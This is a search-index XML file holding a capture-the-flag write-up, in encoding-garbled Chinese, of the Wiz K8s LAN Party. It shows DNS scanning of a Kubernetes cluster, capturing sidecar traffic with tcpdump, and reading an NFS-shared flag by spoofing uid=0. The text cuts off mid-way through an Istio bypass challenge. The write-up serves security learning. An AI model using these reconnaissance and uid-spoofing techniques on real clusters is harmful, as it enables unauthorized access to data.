<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>K8S_LAN_PARTY_WriteUp</title>
      <link href="/2024/03/23/K8S-LAN-PARTY-WriteUp/"/>
      <url>/2024/03/23/K8S-LAN-PARTY-WriteUp/</url>
      
        <content type="html"><![CDATA[<h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><h3 id="åœ°å€"><a href="#åœ°å€" class="headerlink" title="åœ°å€"></a>åœ°å€</h3><p><a href="https://k8slanparty.com/">https://k8slanparty.com/</a></p><h3 id="æ—¶é—´"><a href="#æ—¶é—´" class="headerlink" title="æ—¶é—´"></a>æ—¶é—´</h3><p>March 20, 2024 6:30 PM - March 22, 2024 10:30 PM</p><h2 id="Challenge-1ï¼šRECON"><a href="#Challenge-1ï¼šRECON" class="headerlink" title="Challenge 1ï¼šRECON"></a>Challenge 1ï¼šRECON</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><blockquote><p>As a warmup, utilize <a href="https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html#kubernetes-dns-to-the-partial-rescue">DNS scanning</a> to uncover hidden internal services and obtain the flag. We have â€œloaded your machine with dnscan to ease this process for further challenges.</p></blockquote><h3 id="è€ƒç‚¹"><a href="#è€ƒç‚¹" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h3><ul><li>DNScan</li><li>service to ip</li><li>curl</li></ul><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ol><li>ç‚¹è¿› DNS scanning çš„é“¾æ¥ï¼Œæ˜ å…¥çœ¼å¸˜ï¼š</li></ol><blockquote><p>We actually have access to a Kubernetes specific way to identify live services and sometimes pods in the form of the Kubernetes DNS service.</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´é€šè¿‡ DNS æ¥æ¢æµ‹æœåŠ¡ã€‚</p><p>Service è¢«åˆ†é…ä¸€ä¸ªé›†ç¾¤å†…å¯è®¿é—®çš„ IP(Cluster IP) åœ°å€ï¼Œç”¨äºåœ¨é›†ç¾¤å†…éƒ¨å°†æµé‡è·¯ç”±åˆ°å¯¹åº” Podï¼ŒåŒæ—¶æš´éœ²ç«¯å£åˆ°å…¬ç½‘ã€‚ä¸ Service å…³è”çš„ DNS è®°å½•å…è®¸é€šè¿‡ Service çš„åç§°æ¥è®¿é—® Serviceã€‚è¿™äº› DNS è®°å½•ç”± DNS è§£æå™¨ç®¡ç†ã€‚</p><blockquote><p>Pod å’Œ Service çš„ DNS åç§°ä¼šè‡ªåŠ¨ç”Ÿæˆå¦‚ä¸‹ï¼š</p><ul><li>Podï¼špod-ip-address.pod-namespace-name.pod.cluster-domain.exampleï¼ˆä¾‹å¦‚ 10.244.0.1.my-app.svc.cluster.localï¼‰</li><li>Serviceï¼šservice-name.service-namespace-name.svc.cluster-domain.exampleï¼ˆä¾‹å¦‚ database.my-app.svc.cluster.localï¼‰</li></ul></blockquote><ol start="2"><li>ä¹Ÿå°±æ˜¯è¯´ï¼Œæ€è·¯æ˜¯ç”¨ DNScanï¼Œé€šè¿‡ç¯å¢ƒå˜é‡é‡Œçš„ HOST_SERVER IPæ¥åæŸ¥å¯¹åº”çš„ Serviceã€‚</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ <span class="built_in">env</span> | grep HOST</span><br><span class="line">KUBERNETES_SERVICE_HOST=10.100.0.1</span><br><span class="line">player@wiz-k8s-lan-party:~$ dnscan -h</span><br><span class="line">Usage of dnscan:</span><br><span class="line">  -subnet string</span><br><span class="line">        Input to scan, CIDR notation (e.g., 10.5.0.0/24) or wildcard (e.g., 10.5.0.*)</span><br><span class="line">player@wiz-k8s-lan-party:~$ dnscan -subnet 10.100.0.1/16</span><br><span class="line">34967 / 65536 [-------------------------------------------------------------------------&gt;________________________________________________________________] 53.36% 988 p/s10.100.136.254 getflag-service.k8s-lan-party.svc.cluster.local.</span><br><span class="line">65415 / 65536 [-----------------------------------------------------------------------------------------------------------------------------------------&gt;] 99.82% 988 p/s10.100.136.254 -&gt; getflag-service.k8s-lan-party.svc.cluster.local.</span><br><span class="line">65536 / 65536 [-----------------------------------------------------------------------------------------------------------------------------------------] 100.00% 991 p/s</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ° serviceï¼š<code>getflag-service.k8s-lan-party.svc.cluster.local.</code></p><ol start="3"><li>æƒ³äº†ä¸€ä¸‹æ²¡æƒ³åˆ°åç»­åˆ©ç”¨ï¼Œæƒ³åˆ°ç¯å¢ƒå˜é‡é‡Œé¢ç”±å¼€443ç«¯å£ã€‚ç›´æ¥è®¿é—®è¯¥ IPï¼Œä¹Ÿå°±æ˜¯ service åç§° getflag</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ <span class="built_in">env</span></span><br><span class="line">KUBERNETES_SERVICE_PORT_HTTPS=443</span><br><span class="line">KUBERNETES_SERVICE_PORT=443</span><br><span class="line">USER_ID=063cd108-777e-421c-8c5b-ef053f624672</span><br><span class="line">HISTSIZE=2048</span><br><span class="line">PWD=/home/player</span><br><span class="line">HOME=/home/player</span><br><span class="line">KUBERNETES_PORT_443_TCP=tcp://10.100.0.1:443</span><br><span class="line">HISTFILE=/home/player/.bash_history</span><br><span class="line">TMPDIR=/tmp</span><br><span class="line">TERM=xterm-256color</span><br><span class="line">SHLVL=1</span><br><span class="line">KUBERNETES_PORT_443_TCP_PROTO=tcp</span><br><span class="line">KUBERNETES_PORT_443_TCP_ADDR=10.100.0.1</span><br><span class="line">KUBERNETES_SERVICE_HOST=10.100.0.1</span><br><span class="line">KUBERNETES_PORT=tcp://10.100.0.1:443</span><br><span class="line">KUBERNETES_PORT_443_TCP_PORT=443</span><br><span class="line">HISTFILESIZE=2048</span><br><span class="line">_=/usr/bin/env</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸‡èƒ½ curl </span></span><br><span class="line">player@wiz-k8s-lan-party:~$ curl getflag-service.k8s-lan-party.svc.cluster.local</span><br><span class="line">wiz_k8s_lan_party&#123;between-thousands-of-ips-you-found-your-northen-star&#125;</span><br></pre></td></tr></table></figure><h3 id="é™„å½•"><a href="#é™„å½•" class="headerlink" title="é™„å½•"></a>é™„å½•</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzkwMDQ4MDU2MA==&mid=2247484222&idx=1&sn=5a1b2d72398280542e75c5310c6b1d19&scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzkwMDQ4MDU2MA==&amp;mid=2247484222&amp;idx=1&amp;sn=5a1b2d72398280542e75c5310c6b1d19&amp;scene=21#wechat_redirect</a></p><h2 id="Challenge-2ï¼šFINDING-NEIGHBOURS"><a href="#Challenge-2ï¼šFINDING-NEIGHBOURS" class="headerlink" title="Challenge 2ï¼šFINDING NEIGHBOURS"></a>Challenge 2ï¼šFINDING NEIGHBOURS</h2><h3 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><blockquote><p>Sometimes, it seems we are the only ones around, but we should always be on guard against invisible <a href="https://kubernetes.io/docs/concepts/workloads/pods/sidecar-containers/">sidecars</a> reporting sensitive secrets.</p></blockquote><h3 id="è€ƒç‚¹-1"><a href="#è€ƒç‚¹-1" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h3><ul><li>sidecars(network)</li><li>netstat</li><li>tcpdump</li></ul><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ol><li>å…ˆç‚¹å¼€ sidecars çœ‹çœ‹æ€ä¹ˆä¸ªäº‹å„¿</li></ol><blockquote><p><strong>Sidecar containers</strong> are the secondary containers that run along with the main application container within the same Pod These containers are used to enhance or to extend the functionality of the main application container by providing additional services, or functionality such as logging, monitoring, security, or data synchronization, without directly altering the primary application code.</p></blockquote><p>ç›¸å½“äºä¸€ä¸ªé™„å±å®¹å™¨ï¼Œæä¾›é™„åŠ ã€æ‰©å±•åŠŸèƒ½</p><blockquote><p>If an init container is created with its<code>restartPolicy</code>set to<code>Always</code>, it willstart and remain running during the entire life of the Pod. This can be helpful for running supporting services separated from the main application containers.</p></blockquote><p>é…ç½® <code>restartpolicy=Always</code> å ï¼Œå°±ä¼šé»˜è®¤å¯åŠ¨ sidecar çš„åŠŸèƒ½å¹¶ä¸€ç›´è¿è¡Œ.</p><ol start="2"><li>Hint 1</li></ol><blockquote><p>Sidecar containers share the same lifecycle, resources, and network namespace with the primary container This co-location allows them to interact closely and share resources.</p></blockquote><p>å…±ç”¨ç›¸åŒçš„ network å’Œå­˜å‚¨å‘½åç©ºé—´ã€‚</p><ol start="3"><li>ä¿¡æ¯æœé›†</li></ol><ul><li>service</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ dnscan -subnet 10.100.0.1/16</span><br><span class="line">65395 / 65536 [-&gt;] 99.78% 988 p/s10.100.171.123 -&gt; reporting-service.k8s-lan-party.svc.cluster.local.</span><br></pre></td></tr></table></figure><ul><li>network</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: tunl0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ipip 0.0.0.0 brd 0.0.0.0</span><br><span class="line">2113: ns-252e81@if2114: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 06:27:94:7c:7d:aa brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 192.168.8.215/31 scope global ns-252e81</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::427:94ff:fe7c:7daa/64 scope <span class="built_in">link</span> </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><ul><li>netstat</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ netstat -ano </span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer</span><br><span class="line">tcp        0      0 192.168.8.215:45366     10.100.171.123:80       TIME_WAIT   timewait (30.31/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:34758     10.100.171.123:80       TIME_WAIT   timewait (50.36/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:39366     10.100.171.123:80       TIME_WAIT   timewait (40.44/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:36266     10.100.171.123:80       TIME_WAIT   timewait (20.28/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:43638     10.100.171.123:80       TIME_WAIT   timewait (15.27/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:34772     10.100.171.123:80       TIME_WAIT   timewait (50.46/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:45368     10.100.171.123:80       TIME_WAIT   timewait (35.33/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:34786     10.100.171.123:80       TIME_WAIT   timewait (55.48/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:34780     10.100.171.123:80       TIME_WAIT   timewait (55.38/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:39376     10.100.171.123:80       TIME_WAIT   timewait (45.45/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:42832     10.100.171.123:80       TIME_WAIT   timewait (5.24/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:39370     10.100.171.123:80       TIME_WAIT   timewait (45.35/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:42820     10.100.171.123:80       TIME_WAIT   timewait (0.23/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:36274     10.100.171.123:80       TIME_WAIT   timewait (25.30/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:39362     10.100.171.123:80       TIME_WAIT   timewait (40.34/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:43626     10.100.171.123:80       TIME_WAIT   timewait (10.26/0/0)</span><br><span class="line">Active UNIX domain sockets (servers and established)</span><br><span class="line">Proto RefCnt Flags       Type       State         I-Node   Path</span><br></pre></td></tr></table></figure><p>æœ¬åœ°çš„192.168.8.215 ä¸€ç›´å‘ 10.100.171.123:80 é€šä¿¡</p><ol start="4"><li>å¥½å§ï¼Œçœ‹äº†wpï¼Œç›´æ¥ <code>tcpdump</code> æ•è·æµé‡è¯¦ç»†çœ‹çœ‹é€šä¿¡ç»†èŠ‚ã€‚</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ tcpdump host 10.100.171.123  -w 1.pcap</span><br><span class="line">tcpdump: listening on ns-252e81, link-type EN10MB (Ethernet), snapshot length 262144 bytes</span><br><span class="line">^C30 packets captured</span><br><span class="line">30 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br><span class="line">player@wiz-k8s-lan-party:~$ <span class="built_in">cat</span> 1.pcap</span><br><span class="line">Ã”ÃƒÂ²Â¡Ã¯Ã½eÂ«Â¾</span><br><span class="line">JJ&gt;Ã²VA4<span class="comment">#&#x27;|&#125;E&lt;6y@EÃ¤Ã€Ã—</span></span><br><span class="line">dÂ«&#123;Â²Â¢P+SPÂ´</span><br><span class="line">\\IÃ¯Ã½eÂ³Ã€</span><br><span class="line">JJ<span class="string">&#x27;|&#125;Âª&gt;Ã²VA4E&lt;@|]</span></span><br><span class="line"><span class="string">dÂ«&#123;Ã€Ã—PÂ²Â¢Â»Â­Ã‹+SPÃ¾Â´</span></span><br><span class="line"><span class="string">Â¡Ã®Ã¹\\IÃ¯Ã½eÂ¾Ã€</span></span><br><span class="line"><span class="string">BB&gt;Ã²VA4#&#x27;</span>|&#125;E46z@EÃ«Ã€Ã—</span><br><span class="line">dÂ«&#123;Â²Â¢P+SPÂ­ÃŒÃ¶</span><br><span class="line"></span><br><span class="line">\\IÂ¡Ã®Ã¹Ã¯Ã½eÃ¬Ã€</span><br><span class="line">&gt;Ã²VA4<span class="comment">#&#x27;|&#125;E</span></span><br><span class="line">6&#123;@EÃ€Ã—</span><br><span class="line">dÂ«&#123;Â²Â¢P+SPÂ­ÃŒÃ¶[</span><br><span class="line">\\IÂ¡Ã®Ã¹POST / HTTP/1.1</span><br><span class="line">Host: reporting-service</span><br><span class="line">User-Agent: curl/7.64.0</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 63</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">wiz_k8s_lan_party&#123;good-crime-comes-with-a-partner-in-a-sidecar&#125;Ã¯Ã½eÃ‚</span><br><span class="line">BB<span class="string">&#x27;|&#125;Âª&gt;Ã²VA4E4Ã¡@Ã¢</span></span><br><span class="line"><span class="string">dÂ«&#123;Ã€Ã—PÂ²Â¢Â»Â­ÃŒ+SQtÃ¼</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Â¡Ã®Ãº\\IÃ¯Ã½eÃ«ÃŠ</span></span><br><span class="line"><span class="string">&#x27;</span>|&#125;Âª&gt;Ã²VA4EÃ¡@</span><br><span class="line">dÂ«&#123;Ã€Ã—PÂ²Â¢Â»Â­ÃŒ+SQtÃ¼R</span><br><span class="line">Â¡Ã®Ã¼\\IHTTP/1.1 200 OK</span><br><span class="line">server: istio-envoy</span><br><span class="line"><span class="built_in">date</span>: Fri, 22 Mar 2024 05:11:11 GMT</span><br><span class="line">content-type: text/plain</span><br><span class="line">x-envoy-upstream-service-time: 1</span><br><span class="line">x-envoy-decorator-operation: :0/*</span><br><span class="line">transfer-encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure><p><code>wiz_k8s_lan_party&#123;good-crime-comes-with-a-partner-in-a-sidecar&#125;</code></p><h2 id="Challenge-3ï¼šDATA-LEAKAGE"><a href="#Challenge-3ï¼šDATA-LEAKAGE" class="headerlink" title="Challenge 3ï¼šDATA LEAKAGE"></a>Challenge 3ï¼šDATA LEAKAGE</h2><h3 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><strong>Exposed File Share</strong></p><blockquote><p>The targeted big corp utilizes outdated, yet  cloud-supported technology for data storage in production. But oh my,  this technology was introduced in an era when access control was only network-based ğŸ¤¦â€ï¸.</p></blockquote><p><strong>Hint</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä½ å¯èƒ½ä¼šå‘ç°æŸ¥çœ‹ nfs-cat å’Œ nfs-ls çš„æ–‡æ¡£å¾ˆæœ‰ç”¨ã€‚</span><br></pre></td></tr></table></figure><h3 id="è€ƒç‚¹-2"><a href="#è€ƒç‚¹-2" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h3><ul><li>Network File Systemï¼ˆNFSï¼‰</li><li>mount</li><li>nfs-catã€nfs-ls</li></ul><h3 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ol><li><h4 id="nfs-cat-å’Œ-nfs-ls"><a href="#nfs-cat-å’Œ-nfs-ls" class="headerlink" title="nfs-cat å’Œ nfs-ls"></a><code>nfs-cat</code> å’Œ <code>nfs-ls</code></h4><p>å…³æ³¨æè¿°é‡Œçš„ï¼šâ€this technology was introduced in an era when access control was only network-basedâ€ï¼Œå’Œæç¤ºç»™çš„ <code>nfs-cat</code> å’Œ <code>nfs-ls</code></p></li><li><h4 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h4></li></ol><p>NFSï¼Œæ˜¯ Network File System çš„ç®€å†™ï¼Œå³ç½‘ç»œæ–‡ä»¶ç³»ç»Ÿã€‚ç½‘ç»œæ–‡ä»¶ç³»ç»Ÿæ˜¯FreeBSDæ”¯æŒçš„æ–‡ä»¶ç³»ç»Ÿä¸­çš„ä¸€ç§ï¼Œä¹Ÿè¢«ç§°ä¸ºNFS. NFSå…è®¸ä¸€ä¸ªç³»ç»Ÿåœ¨ç½‘ç»œä¸Šä¸ä»–äººå…±äº«ç›®å½•å’Œæ–‡ä»¶ã€‚ é€šè¿‡ä½¿ç”¨NFSï¼Œç”¨æˆ·å’Œç¨‹åºå¯ä»¥åƒè®¿é—®æœ¬åœ°æ–‡ä»¶ä¸€æ ·è®¿é—®è¿œç«¯ç³»ç»Ÿä¸Šçš„æ–‡ä»¶ã€‚</p><p>å°±æ˜¯ä¸€ä¸ªæ•°æ®å­˜å‚¨æœåŠ¡å™¨æˆ–è€…æœåŠ¡ï¼Œè·Ÿä¸»æœºä¹‹é—´é€šè¿‡ nfs æ¥é€šä¿¡ï¼Œä¸»è¦æ˜¯æŒ‚è½½ã€‚</p><ol start="3"><li><h4 id="æŸ¥çœ‹-mount"><a href="#æŸ¥çœ‹-mount" class="headerlink" title="æŸ¥çœ‹ mount"></a>æŸ¥çœ‹ mount</h4></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:/var/run/secrets$ mount | grep nfs    </span><br><span class="line">fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com:/ on /efs <span class="built_in">type</span> nfs4 (ro,relatime,vers=4.1,rsize=1048576,wsize=1048576,namlen=255,hard,noresvport,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=192.168.4.189,local_lock=none,addr=192.168.124.98)</span><br></pre></td></tr></table></figure><p>å‘ç°å¥½ä¸œè¥¿ï¼Œè¿™ä¸å¾—çœ‹çœ‹æ€ä¹ˆä¸ªäº‹å„¿ã€‚</p><blockquote><p>GPT è§£é‡Šï¼š</p><ul><li><code>fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com</code>: è¿™æ˜¯ä¸€ä¸ª NFS æ–‡ä»¶ç³»ç»Ÿçš„è¿œç¨‹æœåŠ¡å™¨åœ°å€ã€‚NFSï¼ˆNetwork File Systemï¼‰æ˜¯ä¸€ç§ç½‘ç»œæ–‡ä»¶ç³»ç»Ÿåè®®ï¼Œå…è®¸è¿œç¨‹è®¡ç®—æœºé€šè¿‡ç½‘ç»œå…±äº«æ–‡ä»¶ã€‚</li><li><code>:/</code>: è¿™è¡¨ç¤ºå°†è¿œç¨‹æ–‡ä»¶ç³»ç»Ÿçš„æ ¹ç›®å½•æŒ‚è½½åˆ°æœ¬åœ°ç›®å½•ã€‚å†’å·ä¹‹å‰æ˜¯è¿œç¨‹æœåŠ¡å™¨çš„åœ°å€å’Œå…±äº«çš„è·¯å¾„ï¼Œå†’å·ä¹‹åæ˜¯æŒ‚è½½ç‚¹ã€‚</li><li><code>/efs</code>: è¿™æ˜¯æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½ç‚¹ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œè¿œç¨‹ NFS æ–‡ä»¶ç³»ç»Ÿçš„æ ¹ç›®å½•å°†ä¼šè¢«æŒ‚è½½åˆ°æœ¬åœ°çš„ <code>/efs</code> ç›®å½•ã€‚</li></ul></blockquote><ol start="4"><li><h4 id="å‘ç°-flag"><a href="#å‘ç°-flag" class="headerlink" title="å‘ç° flag"></a>å‘ç° flag</h4></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:/var/run/secrets$ <span class="built_in">cd</span> /efs</span><br><span class="line">player@wiz-k8s-lan-party:/efs$ <span class="built_in">ls</span></span><br><span class="line">flag.txt</span><br><span class="line">player@wiz-k8s-lan-party:/efs$ <span class="built_in">cat</span> flag.txt</span><br><span class="line"><span class="built_in">cat</span>: flag.txt: Permission denied</span><br></pre></td></tr></table></figure><p>å‘µå‘µå‘µ</p><p>æƒ³åˆ°hinté‡Œçš„ <code>nfs-cat</code> å’Œ <code>nfs-ls</code></p><p><code>nfs-cat</code> å’Œ <code>nfs-ls</code> æ˜¯ NFS (Network File System) çš„ä¸€äº›å¸¸è§å·¥å…·ï¼Œç”¨äºä» NFS æœåŠ¡å™¨ä¸Šè¯»å–æ–‡ä»¶å†…å®¹å’Œåˆ—å‡ºç›®å½•å†…å®¹ã€‚è¿™äº›å·¥å…·é€šå¸¸éœ€è¦åœ¨å®¢æˆ·ç«¯ä¸Šå®‰è£…å¹¶é…ç½® NFS å®¢æˆ·ç«¯æ¥ä½¿ç”¨ã€‚å­¦å­¦è§„åˆ™ï¼Œæ‰§è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nfs-cat <span class="string">&#x27;nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com/flag.txt&#x27;</span></span><br></pre></td></tr></table></figure><p>ä¸çŸ¥é“æ˜¯æˆ‘çš„é—®é¢˜è¿˜æ˜¯<code>nfs server</code> æŒ‚äº†ï¼Œè¿ä¸ä¸Šã€‚æœäº†</p><p>å¥½å§ï¼šæ ¼å¼è¿˜æ˜¯å¥½å¥½çœ‹æ¸…æ¥šï¼Œè¿˜è¦åŠ ä¼ å‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ nfs-cat <span class="string">&#x27;nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com//flag.txt?version=4.1&amp;uid=0&#x27;</span></span><br><span class="line">wiz_k8s_lan_party&#123;old-school-network-file-shares-infiltrated-the-cloud!&#125;</span><br></pre></td></tr></table></figure><h2 id="Challenge-4ï¼šBYPASSING-BOUNDARIES"><a href="#Challenge-4ï¼šBYPASSING-BOUNDARIES" class="headerlink" title="Challenge 4ï¼šBYPASSING BOUNDARIES"></a>Challenge 4ï¼šBYPASSING BOUNDARIES</h2><h3 id="é¢˜ç›®æè¿°-3"><a href="#é¢˜ç›®æè¿°-3" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><strong>The Beauty and The Ist</strong></p><blockquote><p>Apparently, new service mesh technologies hold unique appeal for ultra-elite users (root users). Donâ€™t abuse this power; use it responsibly and with caution.</p></blockquote><p><strong>hint</strong> <code>Try examining Istio&#39;s [IPTables rules](&lt;https://github.com/istio/istio/wiki/Understanding-IPTables-snapshot#use-pid-to-get-iptables&gt;).</code></p><p>é¢˜ç›®ç»™çš„ policy</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">security.istio.io/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">AuthorizationPolicy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">istio-get-flag</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">k8s-lan-party</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">action:</span> <span class="string">DENY</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">&quot;&#123;flag-pod-name&#125;&quot;</span></span><br><span class="line">  <span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">from:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">source:</span></span><br><span class="line">        <span class="attr">namespaces:</span> [<span class="string">&quot;k8s-lan-party&quot;</span>]</span><br><span class="line">    <span class="attr">to:</span></span><br><span class="line">    <span class="bullet">-</span> <span 